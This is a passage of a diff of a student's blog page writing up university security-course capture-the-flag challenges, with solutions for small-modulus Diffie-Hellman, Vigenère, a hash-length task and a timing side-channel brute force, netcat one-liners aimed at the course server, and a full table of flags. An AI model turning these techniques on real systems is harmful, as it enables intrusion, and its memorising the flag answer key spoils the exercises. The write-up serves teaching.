-<td align="left">``</td>
-</tr>
-
-<tr>
-<td align="right">diffie 1</td>
-<td align="left"><code>COMP6441{haCk3rs_gunnA_H4K}</code></td>
-</tr>
-
-<tr>
-<td align="right">diffie 2</td>
-<td align="left"><code>COMP6441{sEcuRe_tHe_plaNet!}</code></td>
-</tr>
-
-<tr>
-<td align="right">MAC</td>
-<td align="left">``</td>
-</tr>
-
-<tr>
-<td align="right">vinegar</td>
-<td align="left"><code>COMP6441{hack_the_gibson}</code></td>
-</tr>
-
-<tr>
-<td align="right">hash length magic</td>
-<td align="left">``</td>
-</tr>
-
-<tr>
-<td align="right">shuffle</td>
-<td align="left"><code>MAKING ASCII ART IS A KEY PART OF THE HACKERS TOOLKIT</code></td>
-</tr>
-
-<tr>
-<td align="right">guess</td>
-<td align="left"><code>COMP6441{trollllolollololllol7}</code></td>
-</tr>
-</tbody>
-</table>
-
-    </div>
-
-    <footer class="post-footer">
-      
-      <nav class="post-nav">
-        <a class="prev" href="../../post/where-you-at/">
-            <i class="iconfont icon-left"></i>
-            <span class="prev-text nav-default">Where You At</span>
-            <span class="prev-text nav-mobile">Prev</span>
-          </a>
-        <a class="next" href="../../post/lec17/">
-            <span class="next-text nav-default">Lecture 17</span>
-            <span class="next-text nav-mobile">Next</span>
-            <i class="iconfont icon-right"></i>
-          </a>
-      </nav>
-    </footer>
-  </article>
-
-  <script>
-  (function(f, a, t, h, o, m){
-    a[h]=a[h]||function(){
-      (a[h].q=a[h].q||[]).push(arguments)
-    };
-    o=f.createElement('script'),
-    m=f.getElementsByTagName('script')[0];
-    o.async=1; o.src=t; o.id='fathom-script';
-    m.parentNode.insertBefore(o,m)
-  })(document, window, '//ss.featherbear.cc/tracker.js', 'fathom');
-  fathom('set', 'siteId', 'NEQTU');
-  fathom('trackPageview');
-  </script>
-        </div>
-        
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="social-links">
-      <a href="mailto:z5206677@student.unsw.edu.au" class="iconfont icon-email" title="email"></a>
-      <a href="https://www.linkedin.com/in/andrewjinmengwong/" class="iconfont icon-linkedin" title="linkedin"></a>
-      <a href="https://github.com/featherbear" class="iconfont icon-github" title="github"></a>
-      <a href="https://www.instagram.com/_andrewjwong/" class="iconfont icon-instagram" title="instagram"></a>
-  <a href="../../index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
-</div>
-
-<div class="copyright">
-  <span class="power-by">
-    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
-  </span>
-  <span class="division">|</span>
-  <span class="theme-info">
-    Theme - 
-    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
-  </span>
-
-  
-
-  <span class="copyright-year">
-    &copy; 
-    2019 - 
-    2021
-    <span class="heart">
-      <i class="iconfont icon-heart"></i>
-    </span>
-    <span class="author">Andrew Wong (z5206677)</span>
-  </span>
-</div>
-    </footer>
-
-    <div class="back-to-top" id="back-to-top">
-      <i class="iconfont icon-up"></i>
-    </div>
-  </div>
-  
-  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
-<script type="text/javascript" src="../../dist/even.26188efa.min.js"></script>
-
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-107434487-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
-
-
-
-
-
-</body>
-</html>
+COMP6441{hacked_the_ether}</pre></td></tr></table></div></div><p>Flag: <code>COMP6441{hacked_the_ether}</code></p><hr><p>Now, the usual piping didn&rsquo;t work, and I&rsquo;m not entirely sure why it didn&rsquo;t work.<br>I even tried adding a time delay between the prints, but it still wouldn&rsquo;t work.<br>If anyone knows why this is the case, please let me know!</p><p><code>python3 -c 'print(-(2*31)+1337)' | nc plsdonthaq.me 1003</code></p><p></details></p><h1 id=category-crypto>Category: Crypto</h1><h2 id=s-birthday-attack-s><s>birthday attack</s></h2><h2 id=diffie-1>diffie 1</h2><p><details></p><blockquote><p>INTERCEPTING DIFFY HELLMAN KEY EXCHANGE<br>Generator: <code>19</code><br>Modulus: <code>239</code><br>Alice: here is my (Generator^mySecret) Mod (Modulus): <code>184</code><br>Bob: here is my (Generator^mySecret) Mod (Modulus): <code>227</code><br>What is their shared key?<br>Eve:</p></blockquote><p><strong>Solution</strong></p><p>The problem with the Diffie Hellman key exchange, is that if the modulus is not large enough, we are able to brute-force crack the secret of each party.</p><p>In this case:<br>Alice&rsquo;s secret is <code>37</code><br>Bob&rsquo;s secret is <code>171</code></p><p>Given either secret, by raising the received public data to our secret, and taking the modulus of that, we are able to determine the shared secret, which in this case is <code>178</code></p><p>Entering <code>178</code> as Eve&rsquo;s response gives us the flag.</p><p><a href=diffie1_solver.py>[diffie1_solver.py]</a><br>Usage: <code>diffie1_solver.py (generator) (modulus) (public)</code><br>If it&rsquo;s taking too long, perhaps use another set of values of the questions</p><p>Flag: <code>COMP6441{haCk3rs_gunnA_H4K}</code></p><p></details></p><h2 id=diffie-2>diffie 2</h2><p><details></p><blockquote><p>BEGINING DIFFY HELLMAN KEY EXCHANGE<br>Generator: <code>61</code><br>Modulus: <code>823</code><br>Here is (Generator^mySecret) Mod (Modulus): <code>373</code><br>Enter yours: &hellip;<br>Enter our secret number: &hellip;</p></blockquote><p><strong>Solution</strong><br>This is just the standard application of the Diffie Hellman process - no brute-forcing or any sort of cracking needed here.</p><p>Pick any secret <code>s</code>, then create your public data (base^<code>s</code> % modulus), and use that as the value for &ldquo;Enter yours&rdquo;.<br>Then just raise the given public data to your secret apply the modulus for the &ldquo;Our secret number&rdquo;</p><p><strong>Trivial Solution</strong><br>Just enter <code>1</code>, and <code>1</code></p><p>Flag: <code>COMP6441{sEcuRe_tHe_plaNet!}</code></p><p></details></p><h2 id=s-mac-s><s>MAC</s></h2><h2 id=vinegar>vinegar</h2><p><details></p><blockquote><p>adamt told me that his facebook password encrypted is this cipher text: Dlc_ppyq_mq_MSKZ6441{lymo_rri_esfqyr}</p></blockquote><p><strong>Solution</strong><br>Vinegar &hellip; hm I wonder if it&rsquo;s a <em>vigenere</em> cipher.</p><p>Apply some analysis, or just brute force it, to determine that the key is <code>key</code>.</p><p>Flag: <code>COMP6441{hack_the_gibson}</code></p><p></details></p><h2 id=s-hash-length-magic-s><s>hash length magic</s></h2><p><details></p><p><strong>Analysis</strong><br>Nothing happens when you connect?<br><em>Or does it?</em></p><p>When you enter more than 255 characters, you get this message:<br><code>Send me 0x100 bytes, [sha256(key + message) + message] Where message is get flag</code></p><p>python3 -c &lsquo;key = &ldquo;a&rdquo;; m = &ldquo;get flag&rdquo;; import hashlib; xx = hashlib.sha256(key.encode() + m.encode()).hexdigest() + m; print(xx + &ldquo;\x00&rdquo; * (0x100 - len(xx)))&rsquo; | nc plsdonthaq.me 9003</p><p></details></p><h1 id=category-misc>Category: Misc</h1><h2 id=shuffle>shuffle</h2><p><details></p><blockquote><p>Can you crack this?<br><a href=shuffle.txt>[shuffle.txt]</a></p></blockquote><p><strong>Solution</strong>
+It&rsquo;s a bunch of ASCII art, with the lines shuffled.<br>We can sort these lines (by increasing number) and after stripping this order information, we can read the flag from ASCII art.</p><p><a href=shuffle_solver.py>[shuffle_solver.py]</a><br><a href=shuffle_solved.txt>[shuffle_solved.txt]</a></p><p>Flag: <code>MAKING ASCII ART IS A KEY PART OF THE HACKERS TOOLKIT</code></details></p><h2 id=guess>guess</h2><p><details></p><blockquote><p>Can you guess the flag?</p></blockquote><p><strong>Analysis</strong><br>The program is asking for some sort of password.<br>If you try to enter <code>A</code>&hellip; it will instantly kick you out.<br>If you try to enter <code>B</code>&hellip; it will instantly kick you out.<br>If you try to enter <code>C</code>&hellip; there&rsquo;s a 0.5s delay&hellip; and then it kicks you out.</p><p>What about a second letter?<br><code>CA</code> -&gt; 0.5s, then kick<br><code>CB</code> -&gt; 0.5s, then kick<br>&hellip;<br><code>CO</code> -&gt; <strong>one second</strong>, then kick.</p><p>Hmm..</p><p><strong>Solution</strong><br>For each correct letter (case-sensitive, order-sensitive), it takes an extra 0.5 seconds to validate.<br>We can use this time-delay as a feedback mechanism to tell us if we are right or not!</p><p>So I hacked together a brute-forcing script, and let it run for a few minutes.<br>After a while, we successfully retrieve the flag!</p><p>Flag: <code>COMP6441{trollllolollololllol7}</code></details></p><h1 id=just-give-me-the-answers>Just give me the answers</h1><table><thead><tr><th align=right>Question</th><th align=left>Flag</th></tr></thead><tbody><tr><td align=right>trivial</td><td align=left>``</td></tr><tr><td align=right>cookie</td><td align=left><code>COMP6441{you_should_consider_doing_comp_[6843/6447]}</code></td></tr><tr><td align=right>ezpz1.0</td><td align=left><code>COMP6443{literally_unhackable}</code></td></tr><tr><td align=right>poodle</td><td align=left><code>COMP6441{how_good_are_buffer_ove}rflows</code></td></tr><tr><td align=right>format0</td><td align=left><code>COMP6441{hacked_the_planet}</code></td></tr><tr><td align=right>format2</td><td align=left><code>COMP6441{hacked_the_planet_2}</code></td></tr><tr><td align=right>int1</td><td align=left><code>COMP6441{hacked_the_ether}</code></td></tr><tr><td align=right>birthday attack</td><td align=left>``</td></tr><tr><td align=right>diffie 1</td><td align=left><code>COMP6441{haCk3rs_gunnA_H4K}</code></td></tr><tr><td align=right>diffie 2</td><td align=left><code>COMP6441{sEcuRe_tHe_plaNet!}</code></td></tr><tr><td align=right>MAC</td><td align=left>``</td></tr><tr><td align=right>vinegar</td><td align=left><code>COMP6441{hack_the_gibson}</code></td></tr><tr><td align=right>hash length magic</td><td align=left>``</td></tr><tr><td align=right>shuffle</td><td align=left><code>MAKING ASCII ART IS A KEY PART OF THE HACKERS TOOLKIT</code></td></tr><tr><td align=right>guess</td><td align=left><code>COMP6441{trollllolollololllol7}</code></td></tr></tbody></table></div><footer class=post-footer><nav class=post-nav><a class=prev href=../../post/where-you-at/><i class="iconfont icon-left"></i><span class="prev-text nav-default">Where You At</span>
+<span class="prev-text nav-mobile">Prev</span></a>
+<a class=next href=../../post/lec17/><span class="next-text nav-default">Lecture 17</span>
+<span class="next-text nav-mobile">Next</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article><script>(function(f,a,t,h,o,m){a[h]=a[h]||function(){(a[h].q=a[h].q||[]).push(arguments)};o=f.createElement('script'),m=f.getElementsByTagName('script')[0];o.async=1;o.src=t;o.id='fathom-script';m.parentNode.insertBefore(o,m)})(document,window,'//ss.featherbear.cc/tracker.js','fathom');fathom('set','siteId','NEQTU');fathom('trackPageview');</script></div></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:z5206677@student.unsw.edu.au class="iconfont icon-email" title=email></a><a href=https://www.linkedin.com/in/andrewjinmengwong/ class="iconfont icon-linkedin" title=linkedin></a><a href=https://github.com/featherbear class="iconfont icon-github" title=github></a><a href=https://www.instagram.com/_andrewjwong/ class="iconfont icon-instagram" title=instagram></a><a href=../../index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>Powered by <a class=hexo-link href=https://gohugo.io>Hugo</a></span>
+<span class=division>|</span>
+<span class=theme-info>Theme -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
+<span class=copyright-year>&copy;
+2019 -
+2021
+<span class=heart><i class="iconfont icon-heart"></i></span><span class=author>Andrew Wong (z5206677)</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script><script type=text/javascript src=../../dist/even.26188efa.min.js></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-107434487-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>
